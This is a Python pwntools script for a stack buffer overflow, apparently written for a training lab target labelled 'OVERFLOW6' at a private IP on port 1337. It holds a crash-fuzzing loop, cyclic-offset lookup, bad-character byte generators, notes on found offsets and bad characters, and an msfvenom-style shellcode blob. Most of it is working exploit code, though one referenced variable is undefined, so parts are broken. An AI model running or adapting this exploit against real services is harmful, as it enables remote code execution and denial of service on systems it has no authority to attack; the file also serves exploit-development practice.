import sys, pwn, icecream, socket, time

##############################################
# Target Infomation
##############################################
ip = "10.10.237.125"
port = 1337
timeout = 5
prefix = bytes("OVERFLOW6 ",'latin-1')

# pattern is used to seek Bad char in payload which can influence the shellcode
# class orderGenerator
# used as a char list generate
class orderGenerator:
    # class init func
    # give a methodname
    def __init__(self,method :str):
        self.method = method
        if   method == "source":
            self.pattern = self.source
        elif method == "order" :
            self.pattern = self.order
        elif method == "orderS":
            self.pattern = self.specialOrder
        elif method == "reverse":
            self.pattern = self.reverse
        else:
            self.pattern = self.specialOrder

    # source list [b'\x00',b'\x01', ...]
    @property
    def source(self):
        return [ bytes(chr(x),'latin-1') for x in range(0,256) ]

    # order one like b'\x00\x01\x02\x03...'
    @property
    def order(self):
        return b''.join(self.source)

    # order special one like b'\x01\x02\x03...\xff\x00'
    @property
    def specialOrder(self):
        return self.order[1:] + b'\x00'

    # reverse order like b'\xff\xfe\xfd...\x00'
    @property
    def reverse(self):
        return self.order[::-1]

    # used like easy print
    def __str__(self):
        return self.pattern
    def __repr__(self):
        return self.pattern


""" 
orderPattern = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n'\
          b'\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15' \
          b'\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f ' \
          b'!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGH' \
          b'IJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnop' \
          b'qrstuvwxyz{|}~\x7f\x80\x81\x82\x83\x84\x85' \
          b'\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f' \
          b'\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99' \
          b'\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3' \
          b'\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad' \
          b'\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7' \
          b'\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1' \
          b'\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb' \
          b'\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5' \
          b'\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf' \
          b'\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9' \
          b'\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3' \
          b'\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
"""

pattern = reversePattern
bitSignA = b'ESON'
bitSignB = b'HUGH'

shellcode_calc  = b""
shellcode_calc += b"\x48\x31\xc9\x48\x81\xe9\xde\xff\xff\xff\x48\x8d\x05"
shellcode_calc += b"\xef\xff\xff\xff\x48\xbb\x35\x22\xcf\x5e\x11\x7a\xd8"
shellcode_calc += b"\x30\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
shellcode_calc += b"\xc9\x6a\x4c\xba\xe1\x92\x18\x30\x35\x22\x8e\x0f\x50"
shellcode_calc += b"\x2a\x8a\x61\x63\x6a\xfe\x8c\x74\x32\x53\x62\x55\x6a"
shellcode_calc += b"\x44\x0c\x09\x32\x53\x62\x15\x6a\x44\x2c\x41\x32\xd7"
shellcode_calc += b"\x87\x7f\x68\x82\x6f\xd8\x32\xe9\xf0\x99\x1e\xae\x22"
shellcode_calc += b"\x13\x56\xf8\x71\xf4\xeb\xc2\x1f\x10\xbb\x3a\xdd\x67"
shellcode_calc += b"\x63\x9e\x16\x9a\x28\xf8\xbb\x77\x1e\x87\x5f\xc1\xf1"
shellcode_calc += b"\x58\xb8\x35\x22\xcf\x16\x94\xba\xac\x57\x7d\x23\x1f"
shellcode_calc += b"\x0e\x9a\x32\xc0\x74\xbe\x62\xef\x17\x10\xaa\x3b\x66"
shellcode_calc += b"\x7d\xdd\x06\x1f\x9a\x4e\x50\x78\x34\xf4\x82\x6f\xd8"
shellcode_calc += b"\x32\xe9\xf0\x99\x63\x0e\x97\x1c\x3b\xd9\xf1\x0d\xc2"
shellcode_calc += b"\xba\xaf\x5d\x79\x94\x14\x3d\x67\xf6\x8f\x64\xa2\x80"
shellcode_calc += b"\x74\xbe\x62\xeb\x17\x10\xaa\xbe\x71\xbe\x2e\x87\x1a"
shellcode_calc += b"\x9a\x3a\xc4\x79\x34\xf2\x8e\xd5\x15\xf2\x90\x31\xe5"
shellcode_calc += b"\x63\x97\x1f\x49\x24\x81\x6a\x74\x7a\x8e\x07\x50\x20"
shellcode_calc += b"\x90\xb3\xd9\x02\x8e\x0c\xee\x9a\x80\x71\x6c\x78\x87"
shellcode_calc += b"\xd5\x03\x93\x8f\xcf\xca\xdd\x92\x16\xab\x7b\xd8\x30"
shellcode_calc += b"\x35\x22\xcf\x5e\x11\x32\x55\xbd\x34\x23\xcf\x5e\x50"
shellcode_calc += b"\xc0\xe9\xbb\x5a\xa5\x30\x8b\xaa\x8a\x6d\x92\x63\x63"
shellcode_calc += b"\x75\xf8\x84\xc7\x45\xcf\xe0\x6a\x4c\x9a\x39\x46\xde"
shellcode_calc += b"\x4c\x3f\xa2\x34\xbe\x64\x7f\x63\x77\x26\x50\xa0\x34"
shellcode_calc += b"\x11\x23\x99\xb9\xef\xdd\x1a\x3d\x70\x16\xbb\x30"

shellcode = ""
# msfvenom   shellcode payload generator !


def pwnTry ():
    remoteServer = pwn.remote(ip,port)
    remoteServer.recvuntil("help.")

    fuzzingData  = prefix
    fuzzingData += ( 1000 ) * b'A'
    fuzzingData += pwn.cyclic(200) # get 61746161 at offset 74

    '''
    fuzzingData  = prefix
    fuzzingData += ( 643 - 257 - 4 ) * b'A'
    fuzzingData += bitSignA
    fuzzingData += pattern
    fuzzingData += bitSignB # 634 EIP locate
    # fuzzingData += pwn.cyclic(100)
    # \x00 \x22 \x23 \x3B \x3C \x82 \x83 \xB9 \xBA
    # \x00\x23\x3C\x83\xBA

    '''
    '''
    # Overflow1
    fuzzingData  = prefix
    fuzzingData += 1800 * b'A'
    # fuzzingData += p64() # EIP 0x61756261  print(pwn.cyclic_find(0x61756261))
    # need ret
    # and execute the ESP 
    fuzzingData += pwn.cyclic(200-18) # ( 1800 + 200 - 18 ) - len(fuzzingData)
    # fuzzingData += b''.join( pattern )
    fuzzingData += b'\x90' * ((1800 + 200 - 18 ) - len(fuzzingData))
    fuzzingData += bitSignA # ESP THERE
    # fuzzingData += b''.join( pattern )
    '''
    print("[+] Send DATA")
    icecream.ic(remoteServer.send(fuzzingData),len(fuzzingData),fuzzingData)
    print("[+] Sent Successful")
    sys.exit( 200 )
    # remoteServer.interactive()


    #icecream.ic(fuzzingData)

def fuzzLoop ():
    loopPrefix = prefix.decode('latin-1')
    string = loopPrefix + "A" * 100
    # chr(41) == "A"
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
        except:
            print("Crashed Server")
            print("Crashed at {} bytes".format(len(string) - len(prefix) -100 ))
            sys.exit(5)
        string += 100 * "A"
        time.sleep(1)


if __name__ == "__main__":
    # banner
    print("++++++++++++++++++++++++++++++++++++++++")
    print("=               PWN Handler            =")
    print("++++++++++++++++++++++++++++++++++++++++")
    print("=command fuzz is fuzzLoop()            =")
    print("=command find is pwn.cyclic_find()     =")
    print("=command else is pwnTry()              =") # function pwnTry is often used 
    print("++++++++++++++++++++++++++++++++++++++++") # so tap twice ENTER can easy entry
    print("Command = ",end = "")
    modeControl = input()
    if modeControl == "find":
        offsetPatternInEIP = 0x616A6161
        icecream.ic( pwn.cyclic_find( offsetPatternInEIP ) )
    elif modeControl == "fuzz":
        fuzzLoop()
    else :
        pwnTry()
